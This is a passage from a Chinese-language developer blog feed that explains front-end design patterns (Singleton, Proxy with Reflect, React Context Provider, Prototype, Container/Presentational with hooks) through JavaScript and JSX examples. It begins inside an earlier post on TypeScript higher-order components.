class="hljs-name">Component</span> &#123;<span class="hljs-attr">...</span>(<span class="hljs-attr">props</span> <span class="hljs-attr">as</span> <span class="hljs-attr">TProps</span>)&#125; &#123;<span class="hljs-attr">...injector</span>&#125; /&gt;</span></span>;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="使用forwardRef"><a href="#使用forwardRef" class="headerlink" title="使用forwardRef"></a>使用<code>forwardRef</code></h4><p>为了“真正的”可重用性，您还应该考虑公开 HOC 的引用。您可以按照<a href="https://github.com/typescript-cheatsheets/react/blob/main/README.md#forwardrefcreateref">基本备忘单</a><code>React.forwardRef&lt;Ref, Props&gt;</code>中记录的方式使用，但我们对更多现实世界的示例感兴趣。<a href="https://gist.github.com/OliverJAsh/d2f462b03b3e6c24f5588ca7915d010e">这是 @OliverJAsh 的一个很好的实践示例</a>（注意 - 它仍然有一些粗糙的边缘，我们需要帮助来测试它&#x2F;记录它）。</p><h4 id="支持defaultProps包裹组件"><a href="#支持defaultProps包裹组件" class="headerlink" title="支持defaultProps包裹组件"></a>支持<code>defaultProps</code>包裹组件</h4><p>如果这是您需要的，请参阅<a href="https://github.com/typescript-cheatsheets/react/issues/86">我们进行的陈旧讨论</a>并评论您的要求。如果需要，我们会再次选择它。</p>]]></content>
    
    
    <categories>
      
      <category>最佳实践</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>React</tag>
      
      <tag>TypeScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>设计模式</title>
    <link href="/blog/2023/09/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/blog/2023/09/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><h3 id="1、单例模式：在我们的应用程序中共享一个全局实例"><a href="#1、单例模式：在我们的应用程序中共享一个全局实例" class="headerlink" title="1、单例模式：在我们的应用程序中共享一个全局实例"></a>1、单例模式：在我们的应用程序中共享一个全局实例</h3><p>单例是可以实例化一次并可以全局访问的类。这个<em>单一实例</em>可以在我们的应用程序中共享，这使得单例非常适合管理应用程序中的全局状态。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> instance;<br><span class="hljs-keyword">let</span> counter = <span class="hljs-number">0</span>;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (instance) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;You can only create one instance!&quot;</span>);<br>    &#125;<br>    instance = <span class="hljs-variable language_">this</span>;<br>  &#125;<br> <br>  <span class="hljs-title function_">getInstance</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;<br>  &#125;<br> <br>  <span class="hljs-title function_">getCount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> counter;<br>  &#125;<br> <br>  <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> ++counter;<br>  &#125;<br> <br>  <span class="hljs-title function_">decrement</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> --counter;<br>  &#125;<br>&#125;<br> <br><span class="hljs-keyword">const</span> singletonCounter = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>());<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> singletonCounter;<br></code></pre></td></tr></table></figure><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>全局变量污染</p><p>拥有全局变量通常被认为是一个糟糕的设计决策。全局范围污染最终可能会意外覆盖全局变量的值，这可能会导致许多意外行为。</p><p>在 ES2015 中，创建全局变量相当罕见。new<code>let</code>和<code>const</code>关键字通过将使用这两个关键字声明的变量保留在块范围内，可以防止开发人员意外污染全局范围。JavaScript 中的新<code>module</code>系统可以更轻松地创建全局可访问的值，而不会污染全局范围，因为能够<code>export</code>从模块中获取值以及<code>import</code>其他文件中的值。</p><p>然而，单例的常见用例是在整个应用程序中拥有某种<strong>全局状态</strong>。让代码库的多个部分依赖于同一个可变对象可能会导致意外的行为。</p><p>通常，代码库的某些部分会修改全局状态中的值，而其他部分则使用该数据。这里的执行顺序很重要：我们不想在没有数据可供使用时意外地首先使用数据！随着应用程序的增长，并且数十个组件相互依赖，理解使用全局状态时的数据流可能会变得非常棘手。</p><p><strong>在 React 中，我们经常通过Redux</strong>或<strong>React Context</strong>等状态管理工具来依赖全局状态，而不是使用单例。尽管它们的全局状态行为可能看起来与单例的行为类似，但这些工具提供<strong>只读状态</strong>而不是单例的<em>可变状态。</em>使用 Redux 时，在组件通过<em>dispatcher发送<strong>发送action后，只有纯函数</strong>Reducer</em>才能更新状态。</p><h3 id="2、代理模式：拦截并控制与目标对象的交互"><a href="#2、代理模式：拦截并控制与目标对象的交互" class="headerlink" title="2、代理模式：拦截并控制与目标对象的交互"></a>2、代理模式：拦截并控制与目标对象的交互</h3><p>通过代理对象，我们可以更好地控制与某些对象的交互。每当我们与对象交互时，代理对象都可以确定行为，例如当我们获取值或设置值时。一般来说，代理人是指代替他人的人。您无需直接与该人交谈，而是与代表您试图联系的人的代理人交谈。JavaScript 中也会发生同样的情况：我们将与 Proxy 对象交互，而不是直接与目标对象交互。</p><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p>让我们创建一个<code>person</code>代表 John Doe 的对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">42</span>,<br>  <span class="hljs-attr">nationality</span>: <span class="hljs-string">&quot;American&quot;</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们不想直接与该对象交互，而是希望与代理对象交互。在 JavaScript 中，我们可以通过创建<code>Proxy</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">42</span>,<br>  <span class="hljs-attr">nationality</span>: <span class="hljs-string">&quot;American&quot;</span>,<br>&#125;;<br> <br><span class="hljs-keyword">const</span> personProxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(person, &#123;<br>  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">obj, prop</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`The value of <span class="hljs-subst">$&#123;prop&#125;</span> is <span class="hljs-subst">$&#123;obj[prop]&#125;</span>`</span>);<br>  &#125;,<br>  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">obj, prop, value</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Changed <span class="hljs-subst">$&#123;prop&#125;</span> from <span class="hljs-subst">$&#123;obj[prop]&#125;</span> to <span class="hljs-subst">$&#123;value&#125;</span>`</span>);<br>    obj[prop] = value;<br>  &#125;,<br>&#125;);<br></code></pre></td></tr></table></figure><p>Proxy的第二个参数是代表<em>处理程序的</em><code>Proxy</code>对象。在处理程序对象中，我们可以根据交互类型定义特定的行为。尽管可以将<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">许多方法</a>添加到代理处理程序中，但最常见的两个是和：<code>get</code>、<code>set</code></p><ul><li><code>get</code>：尝试访问<strong>属性</strong>时被调用</li><li><code>set</code>：尝试<strong>修改</strong>属性时被调用</li></ul><p>当访问该<code>name</code>属性时，代理返回了一个听起来更好听的句子：<code>The value of name is John Doe</code>。</p><p>修改<code>age</code>属性时，代理返回该属性的先前值和新值：<code>Changed age from 42 to 43</code>。</p><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><ul><li>添加验证</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> personProxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(person, &#123;<br>  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">obj, prop</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!obj[prop]) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>        <span class="hljs-string">`Hmm.. this property doesn&#x27;t seem to exist on the target object`</span><br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`The value of <span class="hljs-subst">$&#123;prop&#125;</span> is <span class="hljs-subst">$&#123;obj[prop]&#125;</span>`</span>);<br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">obj, prop, value</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">&quot;age&quot;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value !== <span class="hljs-string">&quot;number&quot;</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Sorry, you can only pass numeric values for age.`</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">&quot;name&quot;</span> &amp;&amp; value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">2</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`You need to provide a valid name.`</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Changed <span class="hljs-subst">$&#123;prop&#125;</span> from <span class="hljs-subst">$&#123;obj[prop]&#125;</span> to <span class="hljs-subst">$&#123;value&#125;</span>.`</span>);<br>      obj[prop] = value;<br>    &#125;<br>  &#125;,<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>格式化</li></ul><h4 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h4><p>JavaScript 提供了一个名为 的内置对象<code>Reflect</code>，它使我们在使用代理时更容易操作目标对象。</p><p>以前，我们尝试通过直接获取或设置带有括号表示法的值来修改和访问代理内目标对象的属性。相反，我们可以使用该<code>Reflect</code>对象。对象上的方法<code>Reflect</code>与对象上的方法具有相同的名称<code>handler</code>。</p><p>我们可以通过 和 访问或修改目标对象的属性，而不是通过 访问属性或设置<code>obj[prop]</code>属性。这些方法接收与处理程序对象上的方法相同的参数。<code>obj[prop] = value``Reflect.get()``Reflect.set()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> personProxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(person, &#123;<br>  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">obj, prop</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`The value of <span class="hljs-subst">$&#123;prop&#125;</span> is <span class="hljs-subst">$&#123;<span class="hljs-built_in">Reflect</span>.get(obj, prop)&#125;</span>`</span>);<br>  &#125;,<br>  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">obj, prop, value</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Changed <span class="hljs-subst">$&#123;prop&#125;</span> from <span class="hljs-subst">$&#123;obj[prop]&#125;</span> to <span class="hljs-subst">$&#123;value&#125;</span>`</span>);<br>    <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(obj, prop, value);<br>  &#125;,<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="3、提供者模式：使数据可供多个子组件使用"><a href="#3、提供者模式：使数据可供多个子组件使用" class="headerlink" title="3、提供者模式：使数据可供多个子组件使用"></a>3、提供者模式：使数据可供多个子组件使用</h3><p>主要针对props方式传递数据时需要层层传递且改造成本大的问题。</p><p>通过提供者模式，我们可以使数据可供多个组件使用。我们可以将所有组件包装在<code>Provider</code>. Provider 是对象提供给我们的高阶组件<code>Context</code>。我们可以使用<code>createContext</code>React 为我们提供的方法创建一个 Context 对象。</p><p>Provider 接收一个<code>value</code>prop，其中包含我们想要传递的数据。<em>包含在该提供程序中的所有</em>组件都可以访问该 prop 的值<code>value</code>。</p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">DataContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>()<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = &#123; ... &#125;<br> <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DataContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;data&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">SideBar</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">DataContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br></code></pre></td></tr></table></figure><p>如何使用？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ListItem</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data &#125; = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">DataContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;data.listItem&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>;<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Text</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data &#125; = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">DataContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;data.text&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data &#125; = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">DataContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;data.title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>提供者模式对于共享全局数据非常有用。提供者模式的一个常见用例是与许多组件共享主题 UI 状态。</p><h4 id="优化：使用hooks-x2F-hoc"><a href="#优化：使用hooks-x2F-hoc" class="headerlink" title="优化：使用hooks&#x2F;hoc"></a>优化：使用hooks&#x2F;hoc</h4><p>我们可以创建一个钩子来为组件提供上下文。我们可以使用一个返回我们需要的上下文的钩子，而不必<code>useContext</code>在每个组件中导入上下文。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useThemeContext</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <span class="hljs-keyword">if</span> (!theme) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;useThemeContext must be used within ThemeProvider&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> theme;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以创建一个 HOC 来包装组件以提供其值，而不是直接用组件来包装组件。这样，我们可以将上下文逻辑与渲染组件分离，从而提高提供者的可重用性。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeProvider</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&quot;dark&quot;</span>);<br> <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">toggleTheme</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">setTheme</span>(theme === <span class="hljs-string">&quot;light&quot;</span> ? <span class="hljs-string">&quot;dark&quot;</span> : <span class="hljs-string">&quot;light&quot;</span>);<br>  &#125;<br> <br>  <span class="hljs-keyword">const</span> providerValue = &#123;<br>    <span class="hljs-attr">theme</span>: themes[theme],<br>    toggleTheme,<br>  &#125;;<br> <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;providerValue&#125;</span>&gt;</span></span><br><span class="language-xml">      &#123;children&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br> <br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;</span>`<span class="hljs-attr">App</span> <span class="hljs-attr">theme-</span>$&#123;<span class="hljs-attr">theme</span>&#125;`&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ThemeProvider</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Toggle</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">List</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeProvider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>每个需要访问 的组件<code>ThemeContext</code>现在可以简单地使用该<code>useThemeContext</code>钩子。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">TextBox</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useThemeContext</span>();<br> <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;theme.theme&#125;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过为不同的上下文创建挂钩，可以轻松地将提供者的逻辑与呈现数据的组件分开。</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>我们不再需要处理<em>prop-drilling</em>，这可以被视为一种反模式。以前，理解应用程序的数据流可能很困难，因为并不总是清楚某些 prop 值的来源。使用 Provider 模式，我们不再需要将 props 不必要地传递给不关心此数据的组件。</p><h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><p>在某些情况下，过度使用提供者模式可能会导致性能问题。<em>所有使用</em>上下文的组件都会在每次状态更改时重新渲染。消耗了useContext的组件都会重新渲染。</p><h3 id="4、原型模式：在同一类型的许多对象之间共享属性"><a href="#4、原型模式：在同一类型的许多对象之间共享属性" class="headerlink" title="4、原型模式：在同一类型的许多对象之间共享属性"></a>4、原型模式：在同一类型的许多对象之间共享属性</h3><p>原型模式是在同一类型的许多对象之间共享属性的有用方法。原型是 JavaScript 原生的对象，可以通过原型链被对象访问。</p><p>当处理应该有权访问相同属性的对象时，原型模式非常强大。我们可以简单地将属性添加到原型中，而不是每次都创建属性的副本，因为所有实例都可以访问原型对象。</p><p>由于所有实例都可以访问原型，因此即使在创建实例之后也可以轻松地将属性添加到原型。</p><h4 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create"></a>Object.create</h4><p><code>Object.create</code>方法允许我们创建一个新对象，我们可以显式地将其原型值传递给该对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> dog = &#123;<br>  <span class="hljs-title function_">bark</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`Woof!`</span>;<br>  &#125;,<br>&#125;;<br> <br><span class="hljs-keyword">const</span> pet1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(dog);<br></code></pre></td></tr></table></figure><p>虽然<code>pet1</code>它本身没有任何属性，但它确实可以访问其原型链上的属性！由于我们将<code>dog</code>对象作为<code>pet1</code>的原型传递，因此我们可以访问该<code>bark</code>属性。</p><p><code>Object.create</code>是一种简单的方法，通过指定新创建的对象的原型，让对象直接从其他对象继承属性。新对象可以通过沿着原型链向下访问新属性。</p><h3 id="5、容器-x2F-展示模式：通过将视图与应用程序逻辑分离来强制关注点分离"><a href="#5、容器-x2F-展示模式：通过将视图与应用程序逻辑分离来强制关注点分离" class="headerlink" title="5、容器&#x2F;展示模式：通过将视图与应用程序逻辑分离来强制关注点分离"></a>5、容器&#x2F;展示模式：通过将视图与应用程序逻辑分离来强制关注点分离</h3><p>在 React 中，强制关注点分离的一种方法是使用<strong>容器&#x2F;演示模式</strong>。通过这种模式，我们可以将视图与应用程序逻辑分开。</p><p>理想情况下，我们希望通过将此过程分为两部分来强制关注点分离：</p><ol><li><strong>展示组件</strong>：关心<em><strong>如何</strong></em>向用户显示数据的组件。在此示例中，这是<em>渲染狗图像列表</em>。</li><li><strong>容器组件</strong>：关心向用户显示<em><strong>哪些数据的组件。</strong></em>在此示例中，这是<em>获取狗图像</em>。</li></ol><p>获取狗图像涉及<strong>应用程序逻辑</strong>，而显示图像仅涉及<strong>视图</strong>。</p><h4 id="hooks实现"><a href="#hooks实现" class="headerlink" title="hooks实现"></a>hooks实现</h4><p>在许多情况下，容器&#x2F;演示模式可以用 React Hooks 代替。Hooks 的引入使开发人员可以轻松添加状态，而无需容器组件来提供该状态。</p><p><code>DogImagesContainer</code>我们可以创建一个自定义挂钩来获取图像并返回狗数组，而不是在组件中包含数据获取逻辑。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useDogImages</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [dogs, setDogs] = <span class="hljs-title function_">useState</span>([]);<br> <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;https://dog.ceo/api/breed/labrador/images/random/6&quot;</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; message &#125;</span>) =&gt;</span> <span class="hljs-title function_">setDogs</span>(message));<br>  &#125;, []);<br> <br>  <span class="hljs-keyword">return</span> dogs;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过使用这个钩子，我们不再需要包装<code>DogImagesContainer</code>容器组件来获取数据并将其发送到展示<code>DogImages</code>组件。相反，我们可以直接在我们的演示<code>DogImages</code>组件中使用这个钩子！</p><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><p>容器&#x2F;表示模式鼓励关注点分离。展示组件可以是负责 UI 